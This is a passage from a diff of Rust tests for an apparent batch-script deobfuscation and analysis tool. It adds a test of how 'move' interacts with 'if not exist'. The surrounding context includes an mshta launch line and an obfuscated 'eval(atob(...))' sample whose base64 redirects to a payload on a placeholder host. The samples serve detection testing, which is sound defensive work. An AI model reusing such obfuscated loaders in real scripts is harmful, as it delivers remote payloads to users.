@@ -24499,6 +24499,23 @@ mshta renamed.hta"#,
     }
 
     #[test]
+    fn move_removes_source_for_later_if_not_exist() {
+        let report = crate::analyze(
+            br#"echo marker>original.txt
+move /y original.txt renamed.txt
+if not exist original.txt set MARK=moved
+echo %MARK%"#,
+            &Config::default(),
+        );
+        assert!(
+            report.deobfuscated.contains("echo moved"),
+            "move did not update source file state for if not exist:\n{}\ntraits={:?}",
+            report.deobfuscated,
+            report.traits
+        );
+    }
+
+    #[test]
     fn move_directory_destination_preserves_generated_script_content() {
         let report = crate::analyze(
             br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vbW92ZS1kaXItanMuZXhhbXBsZS9wYXlsb2FkJw==")) > original.js
